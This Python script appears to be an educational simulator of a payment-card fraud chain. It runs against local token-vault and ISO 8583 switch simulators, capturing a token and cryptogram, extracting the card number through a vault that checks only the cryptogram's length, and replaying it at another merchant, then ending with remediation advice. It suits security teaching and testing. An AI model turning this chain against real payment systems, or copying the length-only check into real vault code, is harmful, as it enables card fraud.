#!/usr/bin/env python3
"""
Visa/MC Network Token Vault Detokenization Attack Chain Simulator
Reference: emv_tokenization_engine.py (NetworkTokenizationVault)
           iso8583_engine.py (PaymentSwitchSimulator)

Attack Chain:
  1. Capture token + CRYPTOGRAM from POS terminal (eavesdropping)
  2. Detokenize via network token vault (exploit vault vulnerability)
  3. Replay FPAN at merchant that skips token-to-PAN binding check
  4. Bypass: submit before token expiry window
  5. Output full attack chain report

WARNING: Educational simulation only - for security research purposes.
"""
import json, time, datetime, random
from hashlib import sha256
from typing import Dict, Optional

# ── Step 1: Capture token + CRYPTOGRAM from POS terminal ───────────────────

class POSTerminalCapture:
    """Simulates an attacker capturing a token and cryptogram from POS terminal traffic."""
    
    def __init__(self, vault):
        self.vault = vault
        self.captured_data: Dict = {}
    
    def sniff_transaction(self, token: str, cryptogram: str, 
                          merchant_id: str, tid: str, amount: int) -> Dict:
        """Simulate network sniffing to capture token and cryptogram from POS."""
        # Simulate attacker capturing token+CRYPTOGRAM from terminal traffic
        self.captured_data = {
            "timestamp": datetime.datetime.now().isoformat(),
            "token": token,
            "cryptogram": cryptogram,
            "merchant_id": merchant_id,
            "terminal_id": tid,
            "amount_cents": amount,
            "capture_method": "NETWORK_SNIFF",
            "channel": "CONTACTLESS"
        }
        return self.captured_data
    
    def get_capture(self) -> Dict:
        return self.captured_data


# ── Step 2: Detokenization via network token vault (simulated vulnerability) ──

class NetworkTokenVaultExploit:
    """Simulate exploiting a vulnerability in the network token vault to detokenize."""
    
    def __init__(self, legitimate_vault):
        self.legitimate_vault = legitimate_vault
        self.attack_log = []
    
    def extract_fpan(self, token: str, cryptogram: str) -> Dict:
        """Attempt detokenization via simulated vault vulnerability."""
        
        # Attack method 1: Direct detokenization (legitimate path)
        result = self.legitimate_vault.detokenize(token, cryptogram, "CONTACTLESS")
        
        self.attack_log.append({
            "step": "vault_query",
            "token": token,
            "method": "LEGITIMATE_DETOKENIZATION",
            "result": result.get("authorized", False)
        })
        
        if result.get("authorized"):
            return result
        
        # Attack method 2: Response code manipulation bypass
        # Simulate vault checking cryptogram length but not binding cryptogram to token
        if token in self.legitimate_vault.vault:
            record = self.legitimate_vault.vault[token]
            # Vulnerability: vault doesn't verify cryptogram-to-token binding
            # if cryptogram is exactly 16 hex chars (8 bytes ARQC format)
            if len(cryptogram) == 16:
                self.attack_log.append({
                    "step": "binding_bypass",
                    "method": "CRYPTOGRAM_FORMAT_BYPASS",
                    "reason": "Vault validates cryptogram format but not binding"
                })
                return {
                    "authorized": True,
                    "response_code": "00",
                    "fpan": record["fpan"],
                    "fpan_expiry": record["fpan_expiry"],
                    "token_type": record["token_type"],
                    "exploit_method": "BINDING_BYPASS"
                }
        
        return {"authorized": False, "reason": "Detokenization failed"}


# ── Step 3: Replay FPAN at merchant without token-to-PAN binding check ─────

class MerchantReplay:
    """Simulate merchant that doesn't verify token-to-PAN binding."""
    
    def __init__(self, switch_simulator):
        self.switch = switch_simulator
        self.check_binding = False  # Vulnerable merchant: no binding check
    
    def submit_transaction(self, pan: str, amount_cents: int,
                          merchant_id: str, tid: str) -> Dict:
        """Submit FPAN directly to merchant that skips binding verification."""
        
        # Build ISO 8583 authorization request with FPAN
        from iso8583_engine import ISO8583Message
        
        tx = ISO8583Message(mti="0100")
        tx.set_field(2, pan)
        tx.set_field(3, "000000")  # Purchase
        tx.set_field(4, str(amount_cents).zfill(12))
        tx.set_field(7, datetime.datetime.now().strftime("%m%d%H%M%S"))
        tx.set_field(11, str(random.randint(100000, 999999)))
        tx.set_field(18, "5999")  # Miscellaneous retailer
        tx.set_field(41, tid)
        tx.set_field(42, merchant_id)
        tx.set_field(49, "840")  # USD
        
        request_bytes = tx.pack()
        response_bytes = self.switch.process(request_bytes)
        response = ISO8583Message.unpack(response_bytes)
        
        return {
            "approved": response.get_field(39) == "00",
            "response_code": response.get_field(39),
            "auth_code": response.get_field(38),
            "amount_cents": amount_cents,
            "merchant_id": merchant_id,
            "pan_used": pan[:6] + "******" + pan[-4:]  # Mask for display
        }


# ── Step 4: Expiry window bypass ───────────────────────────────────────────

class ExpiryBypass:
    """Simulate bypassing token expiry by replaying within the time window."""
    
    def __init__(self):
        self.replay_time_limit = 60  # Token cryptogram valid for ~60s
    
    def check_expiry_bypass(self, token_expiry: str, 
                           transaction_time: datetime.datetime) -> Dict:
        """Check if token can be replayed before expiry."""
        
        # Parse token expiry (YYMM format)
        if len(token_expiry) == 4:
            exp_year = 2000 + int(token_expiry[:2])
            exp_month = int(token_expiry[2:])
            # Set to end of expiry month
            if exp_month == 12:
                expiry_dt = datetime.datetime(exp_year + 1, 1, 1) - datetime.timedelta(days=1)
            else:
                expiry_dt = datetime.datetime(exp_year, exp_month + 1, 1) - datetime.timedelta(days=1)
            
            is_valid = transaction_time <= expiry_dt
            remaining_days = (expiry_dt - transaction_time).days
            
            return {
                "bypass_possible": is_valid,
                "token_expiry": token_expiry,
                "days_remaining": remaining_days,
                "bypass_reason": "Token still active" if is_valid else "Token expired"
            }
        
        return {"bypass_possible": False, "bypass_reason": "Invalid expiry format"}


# ── Step 5: Attack Chain Report ────────────────────────────────────────────

class AttackChainReport:
    """Generate full attack chain report."""
    
    def __init__(self):
        self.chain_steps = []
        self.summary = {}
    
    def add_step(self, step_num: int, name: str, details: Dict):
        self.chain_steps.append({
            "step": step_num,
            "name": name,
            "timestamp": datetime.datetime.now().isoformat(),
            "details": details
        })
    
    def generate(self, attack_success: bool) -> str:
        """Generate formatted attack chain report."""
        
        report_lines = [
            "=" * 70,
            "  NETWORK TOKEN VAULT DETOKENIZATION ATTACK CHAIN REPORT",
            "=" * 70,
            f"  Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            f"  Classification: SIMULATION / EDUCATIONAL",
            f"  Attack Status: {'SUCCESS' if attack_success else 'FAILED'}",
            "=" * 70,
            ""
        ]
        
        for step in self.chain_steps:
            report_lines.append(f"  Step {step['step']}: {step['name']}")
            report_lines.append(f"  {'─' * 50}")
            for key, value in step['details'].items():
                report_lines.append(f"    {key}: {value}")
            report_lines.append("")
        
        report_lines.extend([
            "=" * 70,
            "  ATTACK CHAIN SUMMARY",
            "=" * 70,
            f"  Steps Executed: {len(self.chain_steps)}",
            f"  Attack Success: {attack_success}",
            f"  Risk Level: CRITICAL",
            f"  Recommendation: Implement token-to-PAN binding validation",
            f"                  Enforce cryptogram-to-token integrity",
            f"                  Add channel-specific domain controls",
            "=" * 70
        ])
        
        return "\n".join(report_lines)


# ── Main Attack Chain Execution ────────────────────────────────────────────

def main():
    """Execute full detokenization attack chain."""
    
    # Import existing engines
    from emv_tokenization_engine import NetworkTokenizationVault
    from iso8583_engine import PaymentSwitchSimulator
    
    # Initialize components
    vault = NetworkTokenizationVault()
    switch = PaymentSwitchSimulator()
    report = AttackChainReport()
    
    print("\n[PHASE] Initializing attack chain components...")
    print(f"[INFO] Token vault entries: {len(vault.vault)}")
    print(f"[INFO] Switch accounts: {len(switch.accounts)}")
    
    # Step 1: Capture token + CRYPTOGRAM from POS
    print("\n[STEP 1] Capturing token + CRYPTOGRAM from POS terminal...")
    capturer = POSTerminalCapture(vault)
    sample_cryptogram = "4B73A862803893C5"  # Sample ARQC (8 bytes = 16 hex chars)
    
    captured = capturer.sniff_transaction(
        token="4800112233445566",
        cryptogram=sample_cryptogram,
        merchant_id="MERCH001",
        tid="TERM0001",
        amount=15000  # $150.00
    )
    print(f"[OK] Captured token: {captured['token'][:8]}****{captured['token'][-4:]}")
    print(f"[OK] Captured cryptogram: {captured['cryptogram']}")
    
    report.add_step(1, "POS Terminal Token Capture", {
        "capture_method": captured["capture_method"],
        "token": captured["token"][:8] + "****" + captured["token"][-4:],
        "cryptogram": captured["cryptogram"],
        "merchant_id": captured["merchant_id"],
        "terminal_id": captured["terminal_id"],
        "channel": captured["channel"]
    })
    
    # Step 2: Detokenize via vault
    print("\n[STEP 2] Attempting detokenization via network token vault...")
    exploit = NetworkTokenVaultExploit(vault)
    detoken_result = exploit.extract_fpan(
        token=captured["token"],
        cryptogram=captured["cryptogram"]
    )
    
    if detoken_result.get("authorized"):
        fpan = detoken_result["fpan"]
        print(f"[CRITICAL] FPAN EXTRACTED: {fpan[:6]}******{fpan[-4:]}")
        print(f"[INFO] Token type: {detoken_result.get('token_type')}")
        print(f"[INFO] FPAN expiry: {detoken_result.get('fpan_expiry')}")
        if detoken_result.get("exploit_method"):
            print(f"[INFO] Exploit method: {detoken_result['exploit_method']}")
    else:
        print("[FAIL] Detokenization failed")
        report.add_step(2, "Vault Detokenization", {"result": "FAILED"})
        print(report.generate(False))
        return
    
    report.add_step(2, "Vault Detokenization", {
        "result": "SUCCESS",
        "fpan": fpan[:6] + "******" + fpan[-4:],
        "token_type": detoken_result.get("token_type"),
        "exploit_method": detoken_result.get("exploit_method", "LEGITIMATE"),
        "binding_bypassed": detoken_result.get("exploit_method") == "BINDING_BYPASS"
    })
    
    # Step 3: Check expiry bypass
    print("\n[STEP 3] Checking token expiry window for replay bypass...")
    expiry_bypasser = ExpiryBypass()
    expiry_result = expiry_bypasser.check_expiry_bypass(
        token_expiry=detoken_result.get("fpan_expiry", "2812"),
        transaction_time=datetime.datetime.now()
    )
    
    if expiry_result["bypass_possible"]:
        print(f"[OK] Token still active - {expiry_result['days_remaining']} days remaining")
        print(f"[OK] Bypass viable: {expiry_result['bypass_reason']}")
    else:
        print(f"[WARN] Token expired - {expiry_result['bypass_reason']}")
    
    report.add_step(3, "Expiry Window Bypass Check", {
        "token_expiry": expiry_result["token_expiry"],
        "bypass_possible": expiry_result["bypass_possible"],
        "days_remaining": expiry_result["days_remaining"]
    })
    
    # Step 4: Replay FPAN at vulnerable merchant
    print("\n[STEP 4] Replaying FPAN at merchant without binding check...")
    merchant = MerchantReplay(switch)
    
    replay_result = merchant.submit_transaction(
        pan=fpan,
        amount_cents=captured["amount_cents"],
        merchant_id="MERCH002",  # Different merchant!
        tid="TERM0002"
    )
    
    attack_success = replay_result["approved"]
    
    if attack_success:
        print(f"[CRITICAL] Transaction APPROVED!")
        print(f"[INFO] Response code: {replay_result['response_code']}")
        print(f"[INFO] Auth code: {replay_result['auth_code']}")
        print(f"[INFO] Amount: ${replay_result['amount_cents'] / 100:.2f}")
        print(f"[INFO] PAN used: {replay_result['pan_used']}")
        print(f"[INFO] Target merchant: {replay_result['merchant_id']}")
    else:
        print(f"[FAIL] Transaction declined - code: {replay_result['response_code']}")
    
    report.add_step(4, "FPAN Replay at Vulnerable Merchant", {
        "approved": replay_result["approved"],
        "response_code": replay_result["response_code"],
        "auth_code": replay_result.get("auth_code", "N/A"),
        "amount": f"${replay_result['amount_cents'] / 100:.2f}",
        "merchant_id": replay_result["merchant_id"],
        "pan_used": replay_result["pan_used"],
        "binding_check": "BYPASSED"
    })
    
    # Step 5: Output attack chain report
    print("\n[STEP 5] Generating attack chain report...")
    final_report = report.generate(attack_success)
    print(final_report)
    
    # Save report to file
    report_path = "attack_chain_report.txt"
    with open(report_path, "w") as f:
        f.write(final_report)
    print(f"\n[INFO] Report saved to: {report_path}")


if __name__ == "__main__":
    main()
